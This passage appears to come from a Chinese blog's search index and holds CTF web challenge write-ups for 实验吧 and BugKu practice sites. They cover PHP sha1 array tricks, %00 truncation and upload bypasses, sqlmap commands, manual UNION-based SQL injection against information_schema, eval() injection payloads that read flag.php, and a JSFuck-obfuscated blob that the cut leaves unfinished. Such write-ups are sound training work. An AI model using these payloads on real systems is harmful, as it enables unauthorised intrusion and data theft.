else if (sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;]))      die(&#39;Flag: &#39;.$flag);    else        echo &#39;&lt;p&gt;Invalid password.&lt;/p&gt;&#39;;}else{    echo &#39;&lt;p&gt;Login first!&lt;/p&gt;&#39;;?&gt;</code></pre><p>发现需要构造 str1!=str2 并且两串的 sha1 值相等<br>直接构造肯定不现实<br>根据题目提示,应构造两者的返回值为 false, 即 false===false<br>sha1 与 MD5 都不能处理数组,所以我们构造两个数组 GET 提交<br>得到Flag : CTF{t3st_th3_Sha1}</p><h2 id="Guess-Next-Session"><a href="#Guess-Next-Session" class="headerlink" title="Guess Next Session"></a>Guess Next Session</h2><p>查看提示代码:</p><pre><code class="lang-php">&lt;?phpsession_start(); if (isset ($_GET[&#39;password&#39;])) {    if ($_GET[&#39;password&#39;] == $_SESSION[&#39;password&#39;])        die (&#39;Flag: &#39;.$flag);    else        print &#39;&lt;p&gt;Wrong guess.&lt;/p&gt;&#39;;}mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));?&gt;</code></pre><p>分析代码,发现上面的随机数只是个坑,应该满足条件<code>$_GET[&#39;password&#39;]  ==  $_SESSION[&#39;password&#39;]</code><br>Burp 抓包,将 Cookie 删除,并将 password 置为空<br>GO 得到Flag : CTF{Cl3ar_th3_S3ss1on}</p><h2 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h2><p>查看代码 : </p><pre><code class="lang-php">&lt;?phpif (isset ($_GET[&#39;password&#39;])) {    if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE)    {        echo &#39;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#39;;    }    else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)    {        if (strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !== FALSE)        {            die(&#39;Flag: &#39; . $flag);        }        else        {            echo(&#39;&lt;p&gt;*-* have not been found&lt;/p&gt;&#39;);        }    }    else    {        echo &#39;&lt;p&gt;Invalid password&lt;/p&gt;&#39;;    }}?&gt;</code></pre><p>发现需要提交一个长度小于8,值大于99999999的数字,并且能从中找到<code>*-*</code>字符<br>前两个条件加题干不难想到科学计数法,关键是ereg函数的审计和字符<br>这里可以使用%00截断,ereg函数会从%00处停止验证<br>GET 提交 <code>password=9e9%00*-*</code> 得到 Flag : <code>CTF{Ch3ck_anD_Ch3ck}</code><br><strong>注意%会被URL编码成%25,有点坑</strong></p><h2 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h2><p>没有 js,推测为%00上传绕过<br>Burp 抓包,在路径上添加 <code>1.php+</code>,将 <code>+</code> 的 Hex 值改为00,GO<br>浏览器会自动略去 <code>+</code> 及后面的字符,上传的文件名就会变成 <code>1.php</code><br>得到Flag : <code>flag{SimCTF_huachuan}</code></p><h2 id="看起来有点简单"><a href="#看起来有点简单" class="headerlink" title="看起来有点简单!"></a>看起来有点简单!</h2><p>Sql 注入题,直接用 Sqlmap 就能搞定</p><ol><li><code>--current-db</code> 发现库名为 my_db</li><li><code>-D my_db --tables</code> 发现表名为 thiskey</li><li><code>-D my_db -T thiskey --columns</code> 发现字段名为 k0y</li><li><code>-D my_db -T thiskey -C k0y --dump</code> 得到Flag :  whatiMyD91dump</li></ol><p>手工注入: </p><ol><li><code>id=1&#39;</code> 报错发现数据库类型为 MySQL </li><li><code>id=1 and 1=1</code> 与 <code>id=1 and 1=2</code> 回显不同,判断存在注入点</li><li><code>id=1 order by 1</code> 3 的时候报错,说明字段数为 2</li><li><code>id=1 union select 1,schema_name  from information_schema.schemata</code> 查询数据库名称发现 my_db 和 test 两个数据库</li><li><code>id=1 union select 1,table_name from information_schema.tables where table_schema=my_db</code> 查询数据库中的表名 thiskey</li><li><code>id=1 union select 1,column_name from information_schema.columns where table_schema=&#39;my_db&#39;</code> 查询表中字段名,发现 k0y</li><li><code>id=1 union select 1,k0y from thiskey</code> 得到Flag : whatiMyD91dump</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 实验吧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>BugKu-Web</title>
      <link href="/2019/02/18/BugKu-Web/"/>
      <url>/2019/02/18/BugKu-Web/</url>
      
        <content type="html"><![CDATA[<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>查看源码,得 flag:<code>KEY{Web-2-bugKssNNikls9100}</code></p><h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>要求提交算式得结果,用 JS 验证<br>查看源码,发现可能是 <code>code.js</code><br> 然后进入查看,发现 flag:<code>flag{CTF-bugku-0032}</code></p><h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><pre><code class="lang-php">$num=$_GET[&#39;num&#39;];  if(!is_numeric($num))  {  echo $num;  if($num==1)  echo &#39;flag{**********}&#39;;  }</code></pre><p>简单的 %00 绕过<br>直接构造 payload:<code>?num=1%00</code><br>得到 flag:<code>flag{bugku-789-ps-ssdf}</code></p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>点开后一直弹出窗口<br>果断 Burp 抓包<br>在 Response 最后发现</p><pre><code class="lang-php">&lt;!--&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;--&gt;</code></pre><p>粘贴到 Google 上,回车<br>得到 flag:<code>KEY{J2sa42ahJK-HS11III}</code></p><h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p>修改 windows 下的 <code>c:\windows\system32\drivers\etc\hosts</code><br>添加<br><code>120.24.86.145 flag.bugku.com</code><br>访问 flag.bugku.com 得到 flag:<br><code>KEY{DSAHDSJ82HDS2211}</code></p><p>或者 Burp 抓包,修改 Host</p><pre><code>GET / HTTP/1.1Host: flag.baidu.com ##修改 HostPragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close</code></pre><p>提交的 flag</p><h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p>进入链接,发现页面一直闪,果断 Burp 抓包<br>在 Response 里</p><pre><code class="lang-php">HTTP/1.1 200 OKServer: nginxDate: Fri, 08 Mar 2019 05:20:52 GMTContent-Type: text/htmlConnection: closeContent-Length: 614ï»¿&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;&lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;&lt;meta name=&quot;author&quot; content=&quot;&quot;&gt;&lt;title&gt;Dummy game&lt;/title&gt;&lt;/head&gt;&lt;script language=&quot;JavaScript&quot;&gt;function myrefresh(){window.location.reload();}setTimeout(&#39;myrefresh()&#39;,500); &lt;/script&gt;&lt;body&gt;&lt;center&gt;&lt;strong&gt;I want to play Dummy game with othersÂ£Â¡But I can&#39;t stop!&lt;/strong&gt;&lt;/center&gt;&lt;center&gt;Stop at panda ! u will get flag&lt;/center&gt;&lt;center&gt;&lt;div&gt;&lt;img src=&quot;11.jpg&quot; /&gt;&lt;/div&gt;&lt;/center&gt;&lt;br&gt;&lt;a style=&quot;display:none&quot;&gt;flag is here~&lt;/a&gt;&lt;/body&gt;# 这里有猫腻&lt;/html&gt;</code></pre><p>多提交几次</p><pre><code class="lang-php">HTTP/1.1 200 OKServer: nginxDate: Fri, 08 Mar 2019 05:18:07 GMTContent-Type: text/htmlConnection: closeContent-Length: 630ï»¿&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;&lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;&lt;meta name=&quot;author&quot; content=&quot;&quot;&gt;&lt;title&gt;Dummy game&lt;/title&gt;&lt;/head&gt;&lt;script language=&quot;JavaScript&quot;&gt;function myrefresh(){window.location.reload();}setTimeout(&#39;myrefresh()&#39;,500); &lt;/script&gt;&lt;body&gt;&lt;center&gt;&lt;strong&gt;I want to play Dummy game with othersÂ£Â¡But I can&#39;t stop!&lt;/strong&gt;&lt;/center&gt;&lt;center&gt;Stop at panda ! u will get flag&lt;/center&gt;&lt;center&gt;&lt;div&gt;&lt;img src=&quot;10.jpg&quot;/&gt;&lt;/div&gt;&lt;/center&gt;&lt;br&gt;&lt;a style=&quot;display:none&quot;&gt;flag{dummy_game_1s_s0_popular}&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>得到 flag:<br><code>flag{dummy_game_1s_s0_popular}</code></p><h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><p>进入看见代码,为代码审计</p><pre><code class="lang-php">`&lt;?php  include &quot;flag.php&quot;;  $a = @$_REQUEST[&#39;hello&#39;];  eval( &quot;var_dump($a);&quot;);  show_source(__FILE__);  ?&gt;`</code></pre><p>常见 eval() 漏洞<br>直接构造 payload:<code>?hello=file(&#39;flag.php&#39;)</code><br>得到 flag:<code>flag{bug-ctf-gg-99}</code></p><pre><code class="lang-php">file_get_contents(&#39;flag.php&#39;)show_source(&#39;flag.php&#39;)# 均可</code></pre><h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><pre><code class="lang-php">flag In the variable ! &lt;?php  error_reporting(0);  include &quot;flag1.php&quot;;  highlight_file(__file__);  if(isset($_GET[&#39;args&#39;])){  $args = $_GET[&#39;args&#39;];  if(!preg_match(&quot;/^\w+$/&quot;,$args)){  die(&quot;args error!&quot;);  }  eval(&quot;var_dump($$args);&quot;);  }  ?&gt;</code></pre><p>进入看见代码<br>同样是 eval() 函数,但是它进行了正则式匹配,不能像上一题一样绕过<br>并且它用变量转存了提交的 <code>$_GET</code> 变量值进行验证,所以也不好利用  preg_match() 函数不能处理数组的漏洞<br>提示中 <code>flag In  the variable !</code> 想到 var_dump() 函数的 <code>$GLOBALS</code> 变量 <code>$$a</code> 会将 <code>$a</code> 的值替换为 <code>GLOBALS</code>,也就是说 <code>$$a</code> 会解析成 <code>$GLOBALS</code> </p><p>综上,构造 payload:<code>?args=GLOBALS</code><br>提交得到 flag:<br><code>flag{92853051ab894a64f7865cf3c2128b34}</code></p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>查看源码,发现一堆括号</p><pre><code>([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[])[+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+!+[]]]+(+(!+[]+!+[]+!+[]+[!+[]+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]])+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[])[+[]]+(+(!+[]+!+[]+[+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+[+!+[]])+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+